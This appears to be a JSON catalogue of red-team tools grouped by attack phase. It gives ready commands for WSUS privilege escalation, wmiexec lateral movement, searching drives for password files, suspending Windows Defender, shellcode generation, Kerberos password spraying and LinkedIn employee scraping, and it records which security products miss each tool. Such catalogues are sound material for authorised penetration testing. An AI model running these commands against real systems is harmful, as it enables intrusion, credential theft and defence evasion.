    "content": "## [[SOCKS Proxy]]\n``````sh\nproxychains python3 /usr/local/bin/wmiexec.py EDU/john@10.10.1.20\n``````\n\n",
    "commands": [],
    "latest_commit": "2023-05-15T15:04:47Z"
  },
  {
    "name": "WSuspicious",
    "phases": [
      "03. Host Enumeration",
      "09. AD Misconfigurations"
    ],
    "category": "",
    "stealthy": false,
    "platforms": [
      "Windows"
    ],
    "source": "https://github.com/GoSecure/WSuspicious",
    "description": "WSUS exploitation tool",
    "undetected": [],
    "detected": [],
    "content": "# WSuspicious\n\n## [[09.AD Misconfigurations/WSUS]] [[Misconfigurations/WSUS]]\n1. Add user to Admin and drop file as confirmation:\n    ```bash\n    .\\WSuspicious.exe /command:\" -accepteula -s -d cmd /c \"\"echo eop_executed > C:\\\\eop_poc.txt; net localgroup Administratoren ext_ecorp_user /add\"\"\" /autoinstall\n    ```\n\n",
    "commands": [],
    "latest_commit": "2020-10-30T17:52:36Z"
  },
  {
    "name": "qwinsta-quser",
    "phases": [
      "03. Host Enumeration"
    ],
    "requirements": [],
    "results": [],
    "category": "",
    "stealthy": false,
    "platforms": [
      "Windows"
    ],
    "source": "https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/qwinsta",
    "description": "Available on Windows servers; requires local admin on target machines.\n\nList logged in users\nqwinsta/quser /server:myremote.server",
    "undetected": [],
    "detected": [],
    "content": "",
    "commands": []
  },
  {
    "name": "dig",
    "phases": [
      "02. Reconnaissance"
    ],
    "category": "",
    "stealthy": false,
    "platforms": [
      "Linux"
    ],
    "source": "https://linux.die.net/man/1/dig",
    "description": "DNS lookup utility\n\ndig @nameserver name recordtype\n\ne.g.\n\ndig @1.1.1.1 myevildoma.in A\n\nVia SOCKS proxy:\nUse +tcp and +vc options to perform DNS requests via TCP.\n",
    "undetected": [],
    "detected": [],
    "content": "",
    "commands": [
      {
        "id": "7c296daf-1dda-4811-bdfe-0f74b2d7ee29",
        "name": "Query A record",
        "description": "",
        "tag": "",
        "results": [],
        "cmd": "dig @nameserver name recordtype\ndig @1.1.1.1 apple.com A"
      },
      {
        "id": "c16ec93a-68d6-4de4-9e40-ea23377b9d2d",
        "name": "Get Domain Controller (Global Catalog) ",
        "description": "Look up the Windows global catalog (GC) record and the authoritative domain server record to determine domain controller addresses",
        "tag": "",
        "results": [],
        "cmd": "dig _gc. <domain>",
        "requirements": {
          "tag": "INTEL:DOMAIN:DOMAINS"
        }
      },
      {
        "id": "d4866eaf-525f-47b1-9412-c9037706bada",
        "name": "Server NS query",
        "description": "",
        "tag": "",
        "results": [],
        "cmd": "dig -t NS <domain>"
      }
    ]
  },
  {
    "name": "SauronEye",
    "phases": [
      "03. Host Enumeration",
      "06. Domain Enumeration",
      "02. Reconnaissance"
    ],
    "category": "",
    "stealthy": false,
    "platforms": [
      "Windows"
    ],
    "source": "https://github.com/vivami/SauronEye",
    "description": "Search tool to find specific files containing specific words, i.e. files containing passwords..",
    "undetected": [
      "Windows Defender (AV)",
      "MDE"
    ],
    "detected": [],
    "commands": [
      {
        "id": "79bf0a10-5f2b-4194-b826-f79599092a9c",
        "name": "Find passwords in files",
        "description": "Find passwords in files",
        "tag": "",
        "results": [
          "CRED:PASS",
          "CRED:USERNAME"
        ],
        "cmd": "SauronEye.exe -d C:\\ --filetypes .txt .ps1 .vba .conf .ini --contents --keywords password pass* -v"
      },
      {
        "id": "157a585d-9c1e-46ac-a530-e5dc70f4e7ab",
        "name": "Find filesnames containing keywords",
        "description": "Find filesnames containing keywords",
        "tag": "",
        "results": [
          "CRED:PASS",
          "CRED:USERNAME"
        ],
        "cmd": "SauronEye.exe -d C:\\ --filetypes .txt .ps1 .vba .conf .ini --keywords password pass* -v"
      }
    ],
    "content": "",
    "latest_commit": "2020-11-18T18:30:39Z"
  },
  {
    "name": "ADExplorer",
    "phases": [
      "06. Domain Enumeration"
    ],
    "category": "",
    "stealthy": false,
    "platforms": [
      "Windows"
    ],
    "source": "https://learn.microsoft.com/en-us/sysinternals/downloads/adexplorer",
    "description": "Active Directory Explorer (AD Explorer) is an advanced Active Directory (AD) viewer and editor. You can use AD Explorer to easily navigate an AD database, define favorite locations, view object properties and attributes without having to open dialog boxes, edit permissions, view an object's schema, and execute sophisticated searches that you can save and re-execute.",
    "undetected": [
      "Windows Defender (AV)",
      "MDE",
      "Symantec"
    ],
    "detected": [],
    "commands": [
      {
        "id": "5c9c5c1b-543f-4a9e-84d3-dd7b75089cb2",
        "name": "Snapshot of full domain ",
        "description": "Snapshot of full domain, between the \" \" you can specify a target domain",
        "tag": "",
        "results": [],
        "cmd": "ADExplorer.exe -snapshot \"\" outfile.dat"
      },
      {
        "id": "2054d057-9098-4d0c-86c6-97b6fa0d6fb3",
        "name": "Snapshot of full domain from external SMB share",
        "description": "Snapshot of full domain from external SMB share, between the \" \" you can specify a target domain",
        "tag": "",
        "results": [],
        "cmd": "\\\\live.sysinternals.com\\Tools\\ADExplorer.exe -snapshot \"\" <domain_snapshot.dat>\n"
      }
    ],
    "content": ""
  },
  {
    "name": "PsSuspend",
    "phases": [
      "10. Bypassing Defenses"
    ],
    "category": "",
    "stealthy": false,
    "platforms": [
      "Windows"
    ],
    "source": "https://learn.microsoft.com/en-us/sysinternals/downloads/pssuspend",
    "description": "PsSuspend lets you suspend processes on the local or a remote system, which is desirable in cases where a process is consuming a resource (e.g. network, CPU or disk) that you want to allow different processes to use. Rather than kill the process that's consuming the resource, suspending permits you to let it continue operation at some later point in time.",
    "undetected": [
      "MDE",
      "Windows Defender (AV)"
    ],
    "detected": [],
    "commands": [
      {
        "id": "92efd3ca-227b-4f76-927a-e3a6d0cdd04b",
        "name": "Suspend process",
        "description": "",
        "tag": "",
        "results": [],
        "cmd": "pssuspend.exe msmpeng.exe"
      }
    ],
    "content": ""
  },
  {
    "name": "donut",
    "phases": [
      "10. Bypassing Defenses"
    ],
    "category": "",
    "stealthy": false,
    "platforms": [
      "Windows",
      "Linux"
    ],
    "source": "https://github.com/TheWover/donut",
    "description": "Generates x86, x64, or AMD64+x86 position-independent shellcode that loads .NET Assemblies, PE files, and other Windows payloads from memory and runs them with parameters",
    "undetected": [],
    "detected": [],
    "commands": [
      {
        "id": "ab7ad162-8447-47b9-94ea-2f4d7273afef",
        "name": "Create shellcode of .NET assembly",
        "description": "Create shellcode of .NET assembly",
        "tag": "",
        "results": [],
        "cmd": "donut.exe -i MyAssembly.exe -c MyAssembly.Program"
      }
    ],
    "content": "",
    "latest_commit": "2023-04-26T21:11:01Z"
  },
  {
    "name": "ADExplorerSnapshot",
    "phases": [
      "06. Domain Enumeration"
    ],
    "category": "",
    "stealthy": false,
    "platforms": [
      "Python"
    ],
    "source": "https://github.com/c3c/ADExplorerSnapshot.py",
    "description": "ADExplorerSnapshot.py is an AD Explorer snapshot parser. It is made as an ingestor for BloodHound, and also supports full-object dumping to NDJSON.",
    "undetected": [],
    "detected": [],
    "commands": [
      {
        "id": "e3e497fc-1857-460a-a33d-3969a0a8de07",
        "name": "Snapshot to bloodhound",
        "description": "Transform snapshot to bloodhound zip",
        "tag": "",
        "results": [
          "INTEL:DOMAIN:COMPUTERS",
          "INTEL:DOMAIN:DOMAINS",
          "INTEL:DOMAIN:GPOS",
          "INTEL:DOMAIN:GROUPS",
          "INTEL:DOMAIN:SID",
          "INTEL:DOMAIN:TRUSTS",
          "INTEL:DOMAIN:USERS"
        ],
        "cmd": "python ADExplorerSnapshot.py -o bhzip /mnt/c/Users/patri/Downloads/projects/bloodhound-import/install_temp.log",
        "requirements": {
          "tag": "Tool:ADExplorer:Snapshot"
        }
      }
    ],
    "content": "",
    "latest_commit": "2023-05-08T16:59:09Z"
  },
  {
    "name": "nbtstat",
    "phases": [
      "02. Reconnaissance"
    ],
    "category": "",
    "stealthy": false,
    "platforms": [
      "Windows"
    ],
    "source": "https://learn.microsoft.com/de-de/windows-server/administration/windows-commands/nbtstat",
    "description": "Zeigt NetBIOS-\u00fcber TCP/IP-Protokollstatistiken (NetBT), NetBIOS-Namenstabellen f\u00fcr den lokalen Computer und Remotecomputer sowie den NetBIOS-Namenscache an. Dieser Befehl erm\u00f6glicht auch eine Aktualisierung des NetBIOS-Namenscaches und der Namen, die bei WINS (Windows Internet Name Service) registriert sind. Bei Verwendung ohne Parameter zeigt dieser Befehl Hilfeinformationen an.",
    "undetected": [],
    "detected": [],
    "commands": [
      {
        "id": "7757830e-cd4e-4ab6-bbf6-d182c10ad1bf",
        "name": "List MAC, hostname, domain",
        "description": "",
        "tag": "",
        "results": [
          "INTEL:DOMAIN:COMPUTERS"
        ],
        "cmd": "for /L %i in (1,1,255) do @nbtstat -A 10.10.10.%i 2>nul && echo 10.10.10.%i"
      },
      {
        "id": "e2acb67d-ffa3-4e66-a9f6-15ef95d7075c",
        "name": "Show NetBIOS-Namenstabelle",
        "description": "",
        "tag": "",
        "results": [
          "INTEL:DOMAIN:COMPUTERS"
        ],
        "cmd": "nbtstat -A <ip>",
        "requirements": {
          "tag": "COMPUTER:IP"
        }
      }
    ],
    "content": "",
    "references": []
  },
  {
    "name": "Metasploit",
    "phases": [
      "02. Reconnaissance"
    ],
    "category": "",
    "stealthy": false,
    "platforms": [
      "Python"
    ],
    "source": "https://www.metasploit.com/",
    "description": "The world\u2019s most used penetration testing framework",
    "undetected": [],
    "detected": [],
    "commands": [
      {
        "id": "4994f588-77be-4a93-aab2-a2e082cd40e4",
        "name": "Get SMB Version",
        "description": "",
        "tag": "",
        "results": [],
        "cmd": "use auxiliary/scanner/smb/smb_version"
      },
      {
        "id": "426ada86-74c3-4eca-99ab-b5d561ecd96e",
        "name": "Get SMTP",
        "description": "",
        "tag": "",
        "results": [],
        "cmd": "use auxiliary/scanner/snmp/snmp_login"
      }
    ],
    "content": "",
    "references": []
  },
  {
    "name": "MDI Check Instance",
    "phases": [
      "02. Reconnaissance"
    ],
    "category": "",
    "stealthy": true,
    "platforms": [
      "Windows"
    ],
    "source": "https://github.com/thalpius/Microsoft-Defender-for-Identity-Check-Instance",
    "description": "This script gets all accepted domains in Microsoft 365 using autodiscover, gets the tenant name and checks if there is a Microsoft Defender for Identity instance. This way you can figure out if a company runs Microsoft Defender for Identity.",
    "undetected": [],
    "detected": [],
    "commands": [
      {
        "id": "2679189c-57e4-4901-abf6-b6055aa45d08",
        "name": "Search for MDI",
        "description": "This script is not 100% accurate!",
        "tag": "",
        "results": [
          "AV:MDI"
        ],
        "cmd": "Import-Module Invoke-MicrosoftDefenderForIdentityCheckInstance.psm1\nInvoke-MicrosoftDefenderForIdentityCheckInstance -domain <domain>"
      }
    ],
    "content": "",
    "references": [],
    "latest_commit": "2021-08-26T16:29:14Z"
  },
  {
    "name": "Active Directory Service Interface",
    "phases": [
      "06. Domain Enumeration"
    ],
    "category": "",
    "stealthy": false,
    "platforms": [
      "Windows"
    ],
    "source": "https://learn.microsoft.com/de-de/windows/win32/adsi/active-directory-service-interfaces-adsi",
    "description": "Active Directory Service Interfaces (ADSI) ist eine Reihe von COM-Schnittstellen, die verwendet werden, um auf die Features von Verzeichnisdiensten aus verschiedenen Netzwerkanbietern zuzugreifen.",
    "undetected": [],
    "detected": [],
    "commands": [
      {
        "id": "d53c8ab4-60b8-4a7c-bd0a-5b9215366d4d",
        "name": "Get Domain Controller",
        "description": "",
        "tag": "",
        "results": [
          "INTEL:DOMAIN:DC"
        ],
        "cmd": "[System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain().DomainControllers",
        "requirements": {}
      },
      {
        "id": "0513b338-00d6-40f6-9e27-e955c0faf923",
        "name": "Enumerate Remote Users",
        "description": "",
        "tag": "",
        "results": [
          "INTEL:DOMAIN:USERS"
        ],
        "cmd": "([ADSI]'WinNT://<computer>/Administrators').psbase.Invoke('Members') | %{$_.GetType().InvokeMember('Name', 'GetProperty', $null, $_, $null)}",
        "requirements": {
          "and": [
            {
              "tag": "SERVICE:SMB"
            },
            {
              "tag": "COMPUTER:CONFIG:REMOTEMANAGEMENT"
            },
            {
              "or": [
                {
                  "tag": "COMPUTER:IP"
                },
                {
                  "tag": "COMPUTER:HOSTNAME"
                }
              ]
            }
          ]
        }
      }
    ],
    "content": "",
    "references": []
  },
  {
    "name": "kerbrute",
    "phases": [
      "07. Lateral Movement",
      "08. Credentials & User Impersonation"
    ],
    "category": "",
    "stealthy": false,
    "platforms": [
      "Linux"
    ],
    "source": "https://github.com/ropnop/kerbrute",
    "description": "This tool is designed to assist in quickly bruteforcing valid Active Directory accounts through Kerberos Pre-Authentication.\nIt is designed to be used on an internal Windows domain with access to one of the Domain Controllers.\nWarning: failed Kerberos Pre-Auth counts as a failed login and WILL lock out accounts",
    "undetected": [],
    "detected": [],
    "commands": [
      {
        "id": "715412f9-fc86-47a6-9e93-00812affcdb4",
        "name": "Password Spray",
        "description": "",
        "tag": "",
        "results": [
          "CRED:PASS:PLAIN"
        ],
        "cmd": "kerbrute_linux_amd64 passwordspray -d <lab.ropnop.com> <domain_users.txt> <Password123>",
        "requirements": {
          "or": [
            {
              "tag": "COMPUTER:HOSTNAME"
            },
            {
              "tag": "COMPUTER:IP"
            }
          ]
        }
      },
      {
        "id": "994572e2-b623-42f2-85a0-5a6d217d3ba5",
        "name": "User Enumeration",
        "description": "",
        "tag": "",
        "results": [
          "CRED:PASS:PLAIN"
        ],
        "cmd": "kerbrute_linux_amd64 userenum -d lab.ropnop.com usernames.txt",
        "requirements": {
          "or": [
            {
              "tag": "COMPUTER:HOSTNAME"
            },
            {
              "tag": "COMPUTER:IP"
            }
          ]
        }
      }
    ],
    "content": "",
    "references": [],
    "latest_commit": "2023-04-29T13:44:26Z"
  },
  {
    "name": "LinkedInDumper",
    "phases": [
      "02. Reconnaissance"
    ],
    "category": "",
    "stealthy": true,
    "platforms": [
      "Python"
    ],
    "source": "https://github.com/l4rm4nd/LinkedInDumper",
    "description": "Python 3 script to dump company employees from LinkedIn API\n\n",
    "undetected": [],
    "detected": [],
    "commands": [
      {
        "id": "307f5b97-4560-4f46-813e-cdb8cb6837ad",
        "name": "Dump linkedin users",
        "description": "",
        "tag": "",
        "results": [
          "INTEL:DOMAIN:EMAILS"
        ],
        "cmd": "usage: linkedindumper.py [-h] --url <linkedin-url> [--cookie <cookie>] [--quiet] [--include-private-profiles] [--email-format EMAIL_FORMAT]\n\noptions:\n  -h, --help            show this help message and exit\n  --url <linkedin-url>  A LinkedIn company url - https://www.linkedin.com/company/<company>\n  --cookie <cookie>     LinkedIn 'li_at' session cookie\n  --quiet               Show employee results only\n  --include-private-profiles\n                        Show private accounts too\n  --email-format        Python string format for emails; for example:\n                         [1] john.doe@example.com > '{0}.{1}@example.com'\n                         [2] j.doe@example.com > '{0[0]}.{1}@example.com'\n                         [3] jdoe@example.com > '{0[0]}{1}@example.com'\n                         [4] doe@example.com > '{1}@example.com'\n                         [5] john@example.com > '{0}@example.com'\n                         [6] jd@example.com > '{0[0]}{1[0]}@example.com'"
      }
    ],
    "content": "",
    "references": [],
    "latest_commit": "2023-03-29T21:00:00Z"
  },
  {
    "name": "nltest",
    "phases": [
      "06. Domain Enumeration"
    ],
    "category": "",
    "stealthy": false,
    "platforms": [
      "Windows"
    ],
    "source": "https://learn.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2012-r2-and-2012/cc731935(v=ws.11)",
    "description": "Nltest is a command-line tool that is built into Windows Server 2008 and Windows Server 2008 R2. It is available if you have the AD DS or the AD LDS server role installed. It is also available if you install the Active Directory Domain Services Tools that are part of the Remote Server Administration Tools (RSAT).",
    "undetected": [
      "Windows Defender (AV)",
      "MDE",
      "McAfee"
    ],
    "detected": [],
    "commands": [
      {
        "id": "6f33649c-a7d6-4a78-861f-2396b89cbda3",
        "name": "Get DC of domain",
        "description": "",
        "tag": "",
        "results": [
          "INTEL:DOMAIN:DC"
        ],
        "cmd": "nltest /dclist:<domain>"
      }
    ],
    "content": "",
    "references": []
  },
  {
    "name": "c2profiler",
    "phases": [
      "00. Infrastructure"
    ],
    "category": "",
    "stealthy": false,
    "platforms": [
      "Web"
    ],
    "source": "https://github.com/molatho/c2profiler",
    "description": "Webapp that allows creating, importing, modifying and \"testing\" of Cobalt Strike malleable profiles in the browser.",
    "undetected": [],
    "detected": [],
    "commands": [],
    "content": "",
    "references": [],
    "latest_commit": "2023-01-24T19:59:08Z"
  }
]